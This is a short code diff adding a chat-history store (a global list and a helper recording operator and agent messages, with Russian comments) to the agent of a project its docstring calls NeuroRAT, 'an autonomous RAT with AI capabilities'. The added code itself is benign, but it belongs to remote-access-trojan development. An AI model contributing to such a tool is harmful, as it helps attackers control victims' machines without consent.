@@ -37,6 +37,21 @@ logging.basicConfig(
 )
 logger = logging.getLogger('neurorat_agent')
 
+# --- Глобальное хранилище истории общения с оператором ---
+chat_history = []
+
+# Функция для добавления сообщения в историю
+def add_to_chat_history(sender, content):
+    chat_history.append({
+        "sender": sender,
+        "content": content,
+        "timestamp": time.time()
+    })
+
+# Пример использования в основном цикле или обработчике команд:
+# add_to_chat_history("user", user_message)
+# add_to_chat_history("agent", agent_response)
+
 class NeuroRATAgent:
     """
     Main agent class for NeuroRAT - an autonomous RAT with AI capabilities.
